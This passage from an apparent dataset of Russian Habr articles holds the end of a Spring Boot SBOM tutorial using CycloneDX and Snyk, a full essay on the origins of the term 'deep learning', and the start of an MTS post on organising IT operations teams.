поддерживает формат CycloneDX для генерации SBOM. Чтобы подключить его, необходимо включить плагин cyclonedx-maven-plugin для Maven в файл pom.xml в корне проекта.<build>   <plugins>     <plugin>       <groupId>org.springframework.boot</groupId>       <artifactId>spring-boot-maven-plugin</artifactId>     </plugin>     <plugin>       <groupId>org.cyclonedx</groupId>       <artifactId>cyclonedx-maven-plugin</artifactId>     </plugin>   </plugins> </build>У нас имеется несколько микросервисов, определенных в одном и том же репозитории Git. Они все используют один и тот же корневой pom.xml. Каждый из них задает свой собственный список зависимостей. Для нашего упражнения нам понадобятся как минимум стартеры для Spring Boot Web и для Actuator. Так или иначе, давайте посмотрим на полный список зависимостей для employee-service (один из микросервисов из примера): <dependencies>   <dependency>     <groupId>org.springframework.cloud</groupId>     <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>   </dependency>   <dependency>     <groupId>org.springframework.cloud</groupId>     <artifactId>spring-cloud-starter-config</artifactId>   </dependency>   <dependency>     <groupId>org.springframework.boot</groupId>     <artifactId>spring-boot-starter-web</artifactId>   </dependency>   <dependency>     <groupId>org.springframework.boot</groupId>     <artifactId>spring-boot-starter-actuator</artifactId>   </dependency>   <dependency>     <groupId>io.micrometer</groupId>     <artifactId>micrometer-tracing-bridge-otel</artifactId>   </dependency>   <dependency>     <groupId>io.opentelemetry</groupId>     <artifactId>opentelemetry-exporter-zipkin</artifactId>   </dependency>   <dependency>     <groupId>io.github.openfeign</groupId>     <artifactId>feign-micrometer</artifactId>   </dependency>   <dependency>     <groupId>org.springdoc</groupId>     <artifactId>springdoc-openapi-starter-webmvc-api</artifactId>     <version>2.6.0</version>   </dependency>   <dependency>     <groupId>org.springframework.boot</groupId>     <artifactId>spring-boot-starter-test</artifactId>     <scope>test</scope>   </dependency>   <dependency>     <groupId>org.instancio</groupId>     <artifactId>instancio-junit</artifactId>     <version>4.8.1</version>     <scope>test</scope>   </dependency> </dependencies>После включения плагина cyclonedx-maven-plugin необходимо выполнить команду mvn package в корневом каталоге репозитория:mvn clean package -DskipTestsПлагин сгенерирует SBOM файлы для всех существующих микросервисов и поместит их в каталог target/classes/META-INF/sbom для каждого модуля Maven. spring-boot-sbom-mavenСгенерированный SBOM файл всегда будет помещаться также и внутри JAR файла. Давайте посмотрим на местоположение SBOM файла внутри uber JAR для employee-service.Чтобы сделать SBOM эндпоинт для актуатора доступным, нам необходимо включить следующее конфигурационное свойство. Поскольку наша конфигурация хранится на сервере Spring Cloud Config, нам следует поместить такое свойство в файл формата YAML внутри каталога config-service/src/main/resources/config.management:   endpoints:     web:       exposure:         include: health,sbomТеперь давайте запустим config-service при помощи следующей команды Maven: $ cd config-service $ mvn clean spring-boot:runПосле этого мы можем запустить наш пример микросервиса. Он загружает конфигурационные свойства из config-service. Он слушает на динамически сгенерированном номере порта. В моем случае он равен 53498. Чтобы увидеть содержимое сгенерированного SBOM файла, нам надо вызвать GET /actuator/sbom/application.Генерация и верификация SBOM файлов с помощью Snyk CLIТочная структура SBOM файла не так уж важна с нашей точки зрения. Нам нужен инструмент, который позволил бы нам верифицировать компоненты и зависимости, опубликованные внутри этого файла. Как уже упоминалось выше, мы можем для этой цели использовать Snyk CLI. Мы проверим файл, сгенерированный в корневом каталоге репозитория. Ниже приводится snyk команда, которая позволяет нам распечатать все обнаруженные уязвимости в SBOM файле:$ snyk sbom test \    --file=target/classes/META-INF/sbom/application.cdx.json \    --experimentalДалее приведен отчет, созданный как вывод команды, выполненной выше. Как вы видите, были обнаружены две проблемы, связанные с включенными зависимостями. Конечно, я не включаю эти зависимости напрямую в pom.xml для Maven. Они были автоматически включены стартерами Spring Boot, которые используются микросервисами. Я даже не знал о том, что Spring Boot включает kotlin-stdlib , даже если я напрямую не использую в приложении никаких Kotlin библиотек.Хотя мы обнаружили две проблемы в отчете, это выглядит не так и плохо. Теперь давайте попробуем проанализировать нечто гораздо более старое. Здесь уже упоминался старый репозиторий с микросервисами: sample-spring-microservices. Он уже находится в статусе archived и использует Spring Boot версии 1.5. Если мы не хотим ничего здесь менять, мы также можем использовать Snyk CLI вместо плагина Maven SBOM. Поскольку встроенная поддержка для SBOM появилась только в Spring Boot 3.3, нет никакого смысла включать плагин для приложений, использующих версию  1.5. Вот так выглядит snyk команда, которая генерирует SBOM для всех проектов внутри репозитория и экспортирует их в файл application.cdx.json: $ snyk sbom --format=cyclonedx1.4+json --all-projects > application.cdx.jsonТеперь давайте проверим SBOM файл, используя ту же команду, что и раньше: $ snyk sbom test --file=application.cdx.json --experimentalТеперь результаты выглядят гораздо более пессимистично. Обнаружились 211 проблем, из них 6 критические.Финальные мыслиSBOM файлы позволяют организациям идентифицировать и устранять потенциальные риски по безопасности более эффективно. Поддержка генерации SBOM файлов от Spring Boot упрощает процесс их внедрения в жизненный цикл разработки программного обеспечения в организации. Присоединяйтесь к русскоязычному сообществу разработчиков на Spring Boot в телеграм — Spring АйО, чтобы быть в курсе последних новостей из мира разработки на Spring Boot и всего, что с ним связано."
76,"Головоломка, кофе и охапка книг, или как я искал истоки термина «Deep Learning». Часть 2",Selectel,IT-инфраструктура для бизнеса,0,"Аппаратное обеспечение, Связь и телекоммуникации, Домены и хостинг",2025-04-09," Привет! Некоторое время назад я начал искать истоки термина «Deep Learning». Тогда я изучал только зарубежные источники и обещал вернуться позже с обзором советской и российской литературы. Что ж, откладывать это больше нельзя. Посмотрим, на кого будут ссылаться отечественные авторы в том, что касается истории развития глубокого обучения. Без долгого вступления — берем в руку пальцы Ctrl/Cmd+F и начинаем раскопки!  Если вам интересны актуальные ML-технологии, их применение и реальные кейсы, регистрируйтесь на митап «MLечный путь — 2025: знания, опыт, комьюнити». Будем не только слушать, но и обмениваться мнениями в дискуссиях, челленджах и на питчах проектов. Каждый участник сможет напрямую поговорить с экспертами, задать вопросы и получить подробную обратную связь. Мероприятие бесплатное — нужно только зарегистрироваться. Задайте вопрос спикерам и получите шанс выиграть подарок от Selectel. 📅 23 апреля, 18:00 📍 Формат участия — онлайн и оффлайн в Санкт-Петербурге.  Николенко С. И., Кадурин А. А., Архангельская Е. О. Я думаю, многие слышали о книге «Глубокое обучение». Оно и понятно — книга круто написана, снабжена богатым техническим материалом.   В числе прочего есть и вполне себе самостоятельный раздел об истории глубокого обучения. Глянем, что там:  Надо полагать, что Юрген Шмидхубер может с этим не согласиться. Он написал статью «How 3 Turing Awardees Republished Key Methods and Ideas Whose Creators They Failed to Credit», в которой есть фрагмент: «…At least until 2019, LBH's web site deeplearning.net advertised deep learning as «moving beyond shallow machine learning since 2006»,[DL7] referring to Hinton's[UN4] and Bengio's[UN5] unsupervised layer-wise pre-training for deep NNs (2006), as if deep learning had started with this work. However, we had this type of deep learning already in 1991.[UN][UN1-2] Hinton & Bengio did not mention the prior work, not even in later surveys.[DL3,DL3a][T22] More on this below». И далее, собственно, он очень подробно разбирает хронологию событий и в конце формулирует претензию: More than a decade after this work,[UN1] Hinton published a similar unsupervised method for more limited feedforward NNs (FNNs), facilitating supervised learning by unsupervised pre-training of stacks of FNNs called Deep Belief Networks (DBNs).[UN4] The 2006 justification was essentially the one I used in the early 1990s for my RNN stack: each higher level tries to reduce the description length (or negative log probability) of the data representation in the level below.[HIN][T22][MIR] Hinton did not mention the 1991 work, not even in later surveys.[T22]  Bengio also published similar work (2006) without citing the original method,[UN5] not even in LBH's much later surveys (2015-2021),[DL3,DL3a][DLC] although both Hinton and Bengio knew it well (also from discussions by email). Even LBH's 2021 Turing Lecture[DL3a] dedicates an extra section to their unsupervised pre-training of deep neural networks (NNs) around 2006, without mentioning that I pioneered this class of methods in 1991.[UN-UN2]  Remarkably, no fewer than four of our priority disputes with LBH (H1, H2, B7, L2) are related to this work of 1991-92.[UN0-1][UN] Today, self-supervised pre-training is heavily used for famous applications such as Chat-GPT—the «P» stands for «pre-trained,» and the «T» for «Transformer.» Note that my first Transformer variant (the unnormalised linear Transformer) also dates back to 1991;[FWP0-1,6][TR1-7][DLH] see disputes H4, B4. В чем же претензия? Ну, собственно, в том, что господа LBH в своих работах не удосуживаются процитировать исследования, в которых уже описывались и проверялись похожие идеи, — так, словно и не было их.  Представьте, что вы проделали исследовательскую работу, вложили в это массу сил, времени, ресурсов (в первую очередь финансовых, на аренду вычислительных ресурсов, сбор данных и вот это все), опубликовали результаты, получили по итогам какой-то отклик от научного сообщества. Представили?  А теперь представьте, что годы спустя вы обнаруживаете, что некто «H» («B» или может даже «L») выпускает исследование. В нем описываются похожие, а может даже и ровно те же идеи, в которые вы когда-то верили, по отношению к которым чувствуете причастность и которые были выстраданы вами в ходе долгих и порой мучительных проб и ошибок. Представили?  А теперь представьте, что эти некто не просто ничего про вас не сказали в своих исследованиях, не просто описали ваши идеи, как свои, но продолжили продвигать «свою истину» даже после того, как вы им несколько раз недвусмысленно намекнули, что так делать нехорошо! Представили?  А теперь задайтесь вопросом: какие эмоции вы будете испытывать по поводу таких людей? Здесь, конечно, уже становится немного сложнее понять, кто прав, поскольку разбор даже последней цитаты и анализ того, имеет ли она право на жизнь, требует внимательного прочтения упомянутых работ. Сам факт наличия подобных претензий и возникающей на этой почве полемики говорит о том, что что-то в этом вопросе есть неладное. Точки над «и» не расставлены. Но идем дальше.   А у кого именно появилась идея? И тут опять же открываем другую статью Шмидхубера и видим следующий фрагмент:  Around 2006, in the context of unsupervised pre-training for less general feedforward networks [15,A8], a Deep Learner reached 1.2% error rate [15] on the MNIST handwritten digits [16], back then the most famous benchmark of Machine Learning. Our team then showed that good old backpropagation [A1] on GPUs (with training pattern distortions [42,43] but without any unsupervised pre-training) can actually achieve a three times better result of 0.35% [17,A10] — back then, a world record (a previous standard net achieved 0.7% [43]. Это просто к слову о том, что, по выражению Дэниела Кревьера из предыдущей статьи, «most pioneering AI research occured in America». Ну разумеется, а как же иначе.  Далее по тексту авторы перечисляют литературу, которую рекомендуют к ознакомлению, включая обзор Юргена Шмидхубера:   Все так, полностью согласен. Я уже ранее упоминал данный обзор и уж в чем в чем, а в дотошности и подробности Юргену отказать невозможно. Но идем дальше:   И снова согласимся. Что там дальше:    Могу лишь от себя скромно присоединиться к рекомендации и дополнительно порекомендовать к прочтению рассмотренную книгу.  Строго говоря, я не нашел здесь исчерпывающего рассказа об истории появления именно термина «глубокое обучение». Но, безусловно, я рекомендую эту книгу, поскольку в ней ярко читается голос автора, который от всей души старается рассказать о глубоком обучении понятно и интересно!    Михаил Лысачев, Александр Прохоров, Денис Ларионов На книгу «Искусственный интеллект. Анализ. Тренды. Мировой опыт» я, как это уже бывало много раз, наткнулся случайно. Ее легко можно найти в свободном доступе. Привлекло в ней, пожалуй, то, что я ничего о ней не знал. Ни разу не видел ее на полках в книжных, особо ничего про нее не слышал. Книжка при этом всем еще и довольно объемная. Точно надо почитать!   Итак, что же можно полезного извлечь по теме происхождения термина «deep learning»? В целом, данная книга во многом повторяет мейнстримное изложение истории развития глубокого обучения в частности и искусственного интеллекта в целом. Есть здесь, например, и вот такая временная диаграмма:   Разумеется, тут будет рассказ и про наших супергероев из предыдущей статьи — Мак-Каллока и Питтса:   И про Розенблатта:   И про Джона МакКарти:    И много еще про кого.  Есть также и попытка объяснить, почему обучение именно глубокое. Чем больше слоев, тем глубже сеть, потому и «глубокое». Изящно.    Нет при этом ни единого упоминания, ни словечка про вклад Рашевского, Ивахненко, Линнаинмаа, Шмидхубера, затронутого здесь разок Хохрайтера и многих-многих других.  Спасибо, хоть про Владимира Вапника и Алексеем Червоненкиса сказали:   Как-то так вышло, что в примерно 80-90 упоминаниях словосочетания «глубокое обучение» не нашлось места для исследователей в области искусственного интеллекта, которые бы работали не в США или Западной Европе. Может потому, что — как нам уже дали понять — «most pioneering AI research occured in America»? Может быть и так. Ну скажите, разве есть хоть какой-то смысл в этом сомневаться?  Из всех упоминаний термина «глубокое обучение», к сожалению, нет ни одного, что могло бы прояснить происхождение этого самого термина. Поэтому более данная книга нам в поисках помочь не сможет. Тем не менее, она будет вполне полезна, если нужно посмотреть на область искусственного с точки зрения экономики и бизнеса, т. к. там на эту тему довольно много разделов и ссылок на внешние источники. Мы же тем временем двинемся дальше.  О книгах, кофе и искусственном интеллекте я также пишу в своем Telegram-канале. Леонид Черняк В очередной раз рыская по интернету, наткнулся на эту книгу:   Одно только оглавление уже заинтриговало:   Как вы думаете, о какой же мафии идет речь? Но идем дальше:   Очень интересно. Один вопрос: а где конкретно Юрген так считает? Дело просто в том, что есть у Юргена в его официальном блоге довольно интересная статья. Что же там Юрген пишет? А вот что:   Говорит ли Юрген что-то об Алексее Григорьевиче? Что же, это довольно просто выяснить. Юрген упоминает Алексея Григорьевича шесть раз. И каждое такое упоминание — это ссылка на его совместную работу с Лапой Валентином Григорьевичем в контексте метода группового учета аргументов.  Это не очень похоже на то, что «Юрген Шмидхубер… считает Ивахненко не только отцом глубокого обучения, но и метода обратного распространения ошибки». Откуда Леонид Черняк это взял, не совсем понятно.  Тем не менее, другая часть этой фразы, а именно «Юрген Шмидхубер … считает Ивахненко … отцом глубокого обучения» подтверждается вполне легко:   Кстати говоря, вот мы и выяснили, кто считает Ивахненко отцом глубокого обучения.  В целом, данную книгу можно еще очень долго разбирать. В ней много интересных разделов, касающихся истории развития интересующего нас термина и соответствующей области исследований. Есть там, например, вот такой абзац:   Сложилось, ну да. Само по себе взяло и сложилось… И да, кстати, про швейцарца Юргена Шмидхубера Леонид Черняк тоже написал:   Много всяких мыслей возникает при прочтении… «Одиозных доказательств российского приоритета»? Предположу, что под одиозностью понимается вот это:   Разумеется, я понимаю, что этот пример полностью подпадает под сказанное мной же в предыдущей статье, а именно:  «…когда речь заходит о том, что «X является первооткрывателем Y», надо делить эту фразу на десять с половиной…» Тут, очевидно, на десять с половиной надо делить слово «впервые», поскольку есть как минимум версия Юргена Шмидхубера, согласно которой современная версия метода обратного распространения ошибки была опубликована в 1970 году в магистерской работе Сеппо Линнаинмаа.  Чтобы проверить, что общего между работами Галушкина и Линнаинмаа, нужно довольно внимательно вчитываться в обе. Делать я этого не буду, поскольку кажется, что это может занять существенное время, а также это немного выходит за рамки темы статьи. Тем не менее, один момент все же хочется подсветить.  Поверхностное прочитывание оригинальной работы Галушкина позволяет понять, что «алгоритм поиска экстремума функции многих переменных» описывается им именно для того, чтобы построить то, что у него называется «многослойная система распознавания».  Оригинальная же работа Сеппо Линнаинмаа написана на финском, так что анализировать ее чуть сложнее. Есть еще, конечно, более поздняя его статья от 1976 года. В ней говорится в более общих терминах о том, что некий вычислительный процесс в общем случае сопровождается ошибками, возникающими в силу того, что вычисления производятся с конечной точностью. В статье Сеппо Линнаинмаа утверждает, ссылаясь на работу Петера Хенричи, что данную накопленную ошибку округления можно представить через разложение Тейлора и через это понять, каков был вклад каждой локальной ошибки на каждом промежуточном шаге вычислительного процесса.  В упомянутом уже разборе Юргена имеется на эту тему вот такой абзац:   Похоже, Александр Иванович Галушкин и Сеппо Линнаинмаа писали плюс-минус об одном и том же. Но Сеппо Линнаинмаа сделал это в более общих терминах, не прикладывая метод к нейронным сетям, и сделал это, увы, раньше.  Получается, опрометчиво говорить, что впервые метод был описан в 1974 году А. И. Галушкиным. Но является ли это утверждение одиозным? Так ли уж далеко это ушло от того, как к подобным фактам относятся зарубежные писатели? Реально ли допустить, что авторы этого утверждения попросту добросовестно заблуждались?  Другая фраза, которая сбила с толку:  «…скандала, устроенного Шмидхубером, то, скорее всего, поводом для него стал тот факт, что его обошли при награждении Тьюринговской премией 2018 за достижения в области глубокого обучения».  С какой стати критика несправедливого присуждения людям незаслуженных заслуг является скандалом? С чего автор взял, что причина в том, что Юргена обошли при награждении? Не очень понятно.  Впрочем, на все это лично я могу закрыть глаза, имея в виду следующее обстоятельство:   Ура! Наконец-то хоть кто-то уделил данному гражданину должное внимание. Далее по тексту можно встретить больше:   Далее идет довольно подробное описание того, как Уолтер Питтс через Рассела, Карнапа, Литтвина и некоторых других действующих лиц познакомился непосредственно с Николаем Петровичем. И хоть на этом описание вклада Рашевского в книге по большому счету заканчивается, надо отдать должное автору: он один из очень немногих (по крайней мере, из тех, кого мы успели рассмотреть), кто постарался приблизиться к объективному описанию истории возникновения нейронных сетей, а следовательно и глубокого обучения.  Впрочем, мы немного отвлеклись, пойдем дальше по книге:   Мы уже натолкнулись на упоминание данных граждан при разборе книги Аггарвала и поиске информации по книге Минского и Пейперта. В принципе тут несложно догадаться, на что ссылается автор.  В целом, прочтение отдельных фрагментов данной книги безусловно помогло мне построить более полную картинку о том, откуда произошел термин «deep learning». Как говорится, дело ясное, что дело темное.  Разумеется, я рекомендую данную книгу для ознакомления, поскольку автор, на мой взгляд, честно пытается рассматривать историческое развитие глубокого обучения непредвзято, хоть и допускает некоторые неточности. Например, вот такие:   При этом у самого Шмидхубера по поводу отношений с Хохрайтером немного другое мнение:   Я не в курсе, бывает ли такое, чтобы один и тот же человек был у другого человека и студентом, и научным руководителем. Наверное, гипотетически такое возможно. Что думаете?  Сергей Марков И вот мы добрались до чертовски интересной работы Сергея Маркова:    Но прежде хочу сказать пару слов о том, как я узнал об этих книгах.  Итак, конференция PyCon, Москва, 26-27 июля 2024 года. Мы с моим коллегой, Антоном Алексеевым, поехали с докладами об инфраструктурных нюансах ML-проектов. Я рассказывал об инструментах профилировки ML-кода, а Антон — о том, как заюзать GPU в Kubernetes без боли и страданий. Антон еще по итогу написал статью. Я тоже до своей статьи по профилировке доберусь, но попозже. 😉  Так вот, на этой же конференции были ребята из SberAutoTech. В частности, выступал Алексей Воропаев с рассказом о том, как писать CUDA-кернелы с использованием Taichi-lang. Я выступил 27-го и, посидев немного на пуфике и передохнув, подошел к стенду SberAutoTech поболтать с ребятами об ML. Было круто, мы разговорились и обменялись контактами.  Я позже сообщил Алексею, что пишу статью об истории DL и хочу его немного расспросить по этой теме, если у него будет время. И вот тут Алексей мне и написал, что недавно вышла большая энциклопедия по истории ML, а на сайте Сергея Маркова, где, собственно, в открытом доступе лежат две части книги «Охота на электроовец. Большая книга искусственного интеллекта».  Сказать, что я «обалдел», — ничего не сказать. Две массивные книги, обе в открытом доступе, гигантский объем ссылок на различные источники, касающиеся не только искусственного интеллекта или глубокого обучения, но и всей истории вычислительной техники в целом. Ух, забористо!  О самой книге, думаю, лучше всего бы рассказал сам Сергей Марков. Впрочем, он так и сделал. Я же просто попробую пошариться по книге в поисках всего, что позволило бы пролить больше света на исходный вопрос о происхождении глубокого обучения.  Итак, приступим:   Как вы думаете, насколько подробно будет описана история этих двух полюбившихся нам граждан? Правильно, очень подробно! Безусловно, глупо было бы не признать, что работа МакКаллока и Питтса — важнейшая веха в истории развития нейронных сетей, поэтому логично ожидать, что поголовно все авторы книг по истории ИИ разбирают данный период и данную работу. Тем не менее, в случае с книгой Сергея Маркова (как и Леонида Черняка) есть одно существенное отличие, а именно:    Итак, это третья книга, которая упоминает Рашевского в контексте работы МакКаллока и Питтса. При этом, если Саймон Хайкин лишь мельком его упомянул, а Леонид Черняк чуть более подробно рассказал о его вкладе, то Марков пошел сильно дальше и снабдил книгу подробнейшим описанием жизненных этапов биографии Николая Петровича. Здесь, думаю, излишне делать какие-то врезки, книги находятся в открытом доступе — настоятельно рекомендую с ними ознакомиться!  Мы же, тем временем, попробуем заглянуть во вторую часть книги:   Что же нас ждет здесь? Правильно, подробнейший рассказ о том, как проводились исследования по так называемым «самонастраивающимся системам» и о ком бы вы думали? Правильно:    И снова приходит на ум вопрос: много ли авторов текстов по истории ИИ об этом говорят? Но идем дальше:   И действительно, где же все-таки начинается глубокое обучение?   Какие вопросы? А вот если вы откроете вторую часть книги, то как раз и узнаете:   А вот уже и знакомая нам по первой части статьи Рина Дехтер! И да, остается только согласиться с автором в том, что знание факта упоминания ей термина «deep learning» в контексте своей работы не добавляет ясности. Но идем дальше:    И далее Сергей Марков приводит пример пример такой архитектуры:   Чуть дальше мы, наконец, приходим к выводу:    И действительно, кто? Что по этому поводу думает автор? А вот что:   Ну что же, тут, как говорится, finita la commedia. Признаться, я ждал какой-то сенсации, но ее не случилось. Тем не менее, очень любопытно, что с очень сильно похожим термином в тот же год вышла статья от других авторов.  Да и вообще, сегодня это самый подробный разбор истории возникновения термина «глубокое обучение». Сомневаюсь, что где-то вы найдете лучше. Я попробовал, сами видите, книжки всякие полистал.  Книгу всячески рекомендую, поскольку из того, что я просмотрел, данные две части — это наиболее подробное описание исторического развития искусственного интеллекта, включая происхождение термина «глубокое обучение».  Итого Ну и что же мы можем сказать по итогу всего увиденного? Понятно только одно: дело ясно, что дело темное.  Пожалуй наиболее обстоятельно к вопросу, которым мы задались в рамках этих двух статей, подошел Сергей Марков в упомянутом выше двухтомнике.  Действительно, работа Рины Дехтер не вводит термин «глубокое обучение» в том смысле, в котором он понимается сейчас. Я даже вполне соглашусь с тем, что этого не делают Игорь Айзенберг, Наум Айзенберг и Йос Вандевалле в своей работе «Многоуровневые и универсальные бинарные нейроны», которая уже упоминалась нами в первой статье. Но если внимательно прочитать то, что написал Сергей Марков, то получается, что и господа LBH тоже этот термин не вводят!  Если прочитать фрагмент, где Сергей Марков говорит о том, что «первенство здесь принадлежит Джеффри Хинтону и его коллегам», и заодно посмотреть статьи, на которые ссылается автор (а именно, «Reducing the Dimensionality of Data with Neural Networks» и «A Fast Learning Algorithm for Deep Belief Nets»), то выяснится, что Хинтон с коллегами вводят термины «глубокий автокодировщик», «глубокая сеть», «глубокие сети доверия», но не «глубокое обучение»! В данных статьях нет ни одного упоминания термина «deep learning».  Зато этот термин действительно неоднократно упоминается в статье «A Multiple-Weight-and-Neuron-Fault Tolerant Digital Multilayer Neural Network» — и уже именно в том смысле, в котором мы привыкли!  Так что выходит, что впервые термин «deep learning» в том смысле, в котором он применяется сейчас, употребили три человека: Тадаёси Хорита, Такуроу Мурата и Ицуо Таканами!   Да, разумеется, можно придраться к тому, что они ввели не совсем этот термин. Можно сказать что-нибудь в стиле: «Ну они же пишут про deep learning method, а не про deep learning».  И вообще, если почитать их работу, то выяснится, что они работают с нейронками, в которых аж целых… один скрытый слой.  И тем не менее, это они в своей статье пишут про «extended back propagation learning algorithm called the deep learning method». Это уже потом, в 2015 году, господа LBH напишут статью под названием «Deep learning», в которой данный термин будет использован аж 21 раз.  При этом если посмотреть на источники, на которые данная статья ссылается, то и там обнаружится, что термин фигурировал в разных работах и раньше. Например, в статье «Deep learning of the tissue regulated splicing code».  Возможно, у вас возникнет вопрос о том, почему тут не рассмотрены труды советских исследователей ИИ (Поспелова, Глушкова, Галушкина, Ивахненко и т. д.), но история советских исследований в этой области заслуживает отдельного цикла статей. Да и кроме того, на эту тему уже есть отличная публикация.  Впрочем, если вам любопытно, рекомендую обратиться к книге Якова Ильича Фета «Рассказы о кибернетике», а затем заглянуть в «Очерки ИСТОРИИ КИБЕРНЕТИКИ в СССР» Василия Дмитриевича Пихоровича.  Финальное определение термина «deep learning» Ну наконец-то! Нет сил терпеть, каково же определение? Может, что-нибудь такое:  Deep learning, или глубокое обучение — это обучение глубоких нейронных сетей. Краткость — сестра таланта! Хотя бьюсь об заклад, что у кого-нибудь в голове возникла эта картинка:   Ну ладно-ладно, пошутили и будет. Может возьмем за основу определение, сформулированное для термина «machine learning» и скажем, что:  «A computer program is said to use deep learning from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T (solved solely with deep artificial neural networks), as measured by P, improves with experience E». Вроде бы даже неплохо выглядит. Только есть проблема: следом за этим определением придется дать определение термина «deep artificial neural networks». И тут мы попадаем в ту самую ловушку, о которой писал Сергей Марков:  «… весьма сложно провести четкую формальную границу, отделяющую глубокие сети от неглубоких». Разумеется, об этом писал не только он. Вот, например, что говорит по этой теме Стьюарт Рассел:   Это, на секундочку, соавтор трехтомника «Искусственный интеллект: современный подход», так что понимаем и запоминаем. Сам же фрагмент был взят из книги «Архитекторы ИИ». К ней мы еще чуть ниже вернемся.  К слову о глубине. Одной из самых амбициозных попыток поставить в этом вопросе точку является раздел монографии Шмидхубера:   Описав очень строго с добрых пару десятков терминов, Юрген ниже пишет следующее:    Вот так вот. Как вы видите, даже Юрген, при всей своей строгости и дотошности, все равно приходит к весьма условному отделению глубоких сетей от неглубоких, так что данный вопрос действительно нетривиальный.  Кстати, а как вам идея воспользоваться понятием «предиктивного телеологического целенаправленного поведения» по Винеру? Допустим, что-нибудь из разряда:  «… глубокое обучение — это раздел кибернетики, направленный на изучение методов использования данных для создания механизмов, основанных на нейронных сетях и обладающих предиктивным телеологическим целенаправленным поведением». Как вам такое? Можно ли так определить термин «глубокое обучение»? Если бы можно было, то мы были бы уже сильно за порогом восстания искусственного интеллекта, поскольку «целенаправленное поведение» по Винеру — это, в первую очередь, «активное поведение»:   Пока что (опять же, насколько мне известно) любая программа, так или иначе использующая нейронную сеть, обладает все же пассивным поведением, не ставит свои собственные цели и не действует в своих собственных интересах. Поправьте меня, если я ошибаюсь.  И кроме этого, хочется подчеркнуть еще один малюсенький, но все же проблемный аспект касательно определений: за одним и тем же термином вполне себе неплохо уживаются разные понятия!  К чему я это все? К тому, что термин «глубокое обучение» можно определять множеством различных способов, они все будут делать упор на каком-то из аспектов, поставленных во главу угла и все будут что-то упускать из виду. На ум приходит притча о слепых и слоне:   Вот, допустим, что говорит Мартин Форд:   А вот что думает мистер «B» (взято из той же книги «Архитекторы ИИ»:    И таких вот вырезок и определений можно найти еще уйму.  Вместо заключения, или кто же все-таки пишет историю В первой части мы мельком упоминали одну замечательную статью о том, кто пишет историю. Есть там вот такой замечательный фрагмент:  Эту фразу, в том или ином виде, несколько раз повторял известный британский писатель Джордж Оруэлл. О том, что история пишется победителями, он записал в своем эссе «As I Please» в 1944 году, а также в своем популярном романе «1984». Там она звучала куда более радикально, но смысл был приблизительно такой же: «Тот, кто управляет прошлым, управляет будущим. Тот, кто управляет настоящим, управляет прошлым». Я бы, пожалуй, несколько перефразировал ее конец, сказав, что тот, кто не знает прошлого, не понимает настоящего, а значит не имеет будущего.  Тут можно сломать не одну охапку копий и в итоге так ни к чему и не прийти. Я лишь надеюсь, что мы сойдемся хотя бы в том, что, так или иначе, изучая прошлое, становление настоящего в прошлом, фантазируя на тему будущего, мы лбом упираемся в одно словосочетание: источник информации. Точнее даже будет сказать не источник, а источники.  Вот мы с вами в данных двух частях посмотрели на ряд книг, так или иначе затрагивающих вопросы истории возникновения термина «глубокое обучение» и в целом истории ИИ. Изложенные соображения — результат целенаправленного поиска источников по очень конкретной теме. Активного поиска. Поиска, нацеленного на то, чтобы сформировать по возможности наиболее полное представление о том, как оно на самом деле было.  А теперь внимание, вопрос: характерен ли активный целенаправленный поиск для сегодняшнего дня? Типична ли ситуация, в которой мы запускаем по любому вопросу мини-исследование с присущей ему работой над сбором и анализом источников информации? Очевидно, нет.  Очевидно, что в этом дивном новом мире, напичканом социальными сетями, новостными лентами, стриминговыми платформами, чат-ботами, рассылками, подкастами, дайджестами, блогами, пуш-уведомлениями, мини-приложениями, приложениями внутри приложений и т. д. и т. п. практически не осталось места для активного поиска. Его стремительно вытесняет подход, в котором мы лишь говорим о том, что нам хочется потреблять (здесь было важно не ошибиться буковкой), а всю остальную работу проделают за нас средства доставки информации.  Средства, оснащенные мощной рекомендательной системой. Средства, доставляющие информацию в промышленных масштабах, массово. Средства массовой доставки информации.  И по сути, тот, кто владеет этими самыми средствами массовой доставки информации, тот и управляет настоящим, а значит, по Оруэллу, прошлым и будущим. А теперь осталось задать один малюсенький вопрос: кто же этими средствами массовой доставки информации владеет?  Ответив на этот вопрос, вы уже можете задаваться другими вопросами о том, кто/что влияет на представление о первенстве и приоритете, о заслугах и роли кого бы то ни было в чем бы то ни было, о позитивном или негативном образе кого бы то ни было и чего бы то ни было в чем бы то ни было.  И на этом мы, пожалуй, поставим в поднятом вопросе точку, а сами двинемся дальше, ведь глубокое обучение, это не просто термин, история которого, как мы убедились, не вполне тривиальна. Это еще и бурно развивающаяся область исследований, являющаяся частью более общей сферы — машинного обучения.  Что это за сфера? Из чего она состоит? Где применяется? Где и в чем у данной сферы есть границы применимости? Интересные вопросы? Я считаю, да.  Вот этими вопросами мы, возможно, в следующих статьях и займемся. А пока всем хорошего времени суток!"
77,Приручая хаос: как структурировать процессы в эксплуатационных командах. Кейс МТС,МТС,Про жизнь и развитие в IT,0,"Связь и телекоммуникации, Мобильные технологии, Веб-сервисы",2025-04-09,"Всем привет! Это Гриша Капцов. Я работаю в Отделе координации и поддержки продуктовых команд в МТС Web Services. А еще — умею повелевать хаосом (вместе с коллегами, конечно же).В мире ИТ-эксплуатации хаос — привычное состояние. Представьте: утро, вы приступаете к работе — и тут внезапно падает ключевой сервис. Пока инженеры устраняют инцидент, поступает эскалация от бизнеса — критическая система тоже работает с перебоями. Тем временем в календаре стоит запланированное обновление инфраструктуры, которое нельзя откладывать. Ну и о какой предсказуемости тут может идти речь? В таких условиях традиционные подходы к управлению задачами часто дают сбой: приоритеты меняются на лету, задачи теряются, нагрузка распределяется неравномерно.Дальше будем разбираться, как структурировать процессы, снизить перегрузку и повысить прозрачность работы. Покажу, как адаптировать ключевые принципы Kanban и Scrum под эксплуатационные реалии. Думаю, этот пост будет полезен инженерам эксплуатации, DevOps-командам, специалистам службы поддержки и всем, кто сталкивается с динамичными задачами в ИТ.Работа в условиях хаосаЭта фраза идеально описывает работу эксплуатационных команд в ИТ. Вот несколько примеров задач, которые для нас — серые будни:срочное устранение инцидентов. Например, внезапно ломается сервер, поддерживающий работу клиентского приложения. Тогда команда должна оперативно найти и устранить причину сбоя;управление эскалированными проблемами. Если на первом уровне поддержки решить задачу не удается, ее передают нам. Например, если клиент не может провести операцию, а причина — в сложном системном сбое, задача моментально становится критической;внедрение изменений. Переход на новую версию базы данных или развертывание обновленного микросервиса требуют тщательной координации, иначе начнутся сбои;обслуживание инфраструктуры и сервисов. Мониторинг нагрузки, резервное копирование, настройка 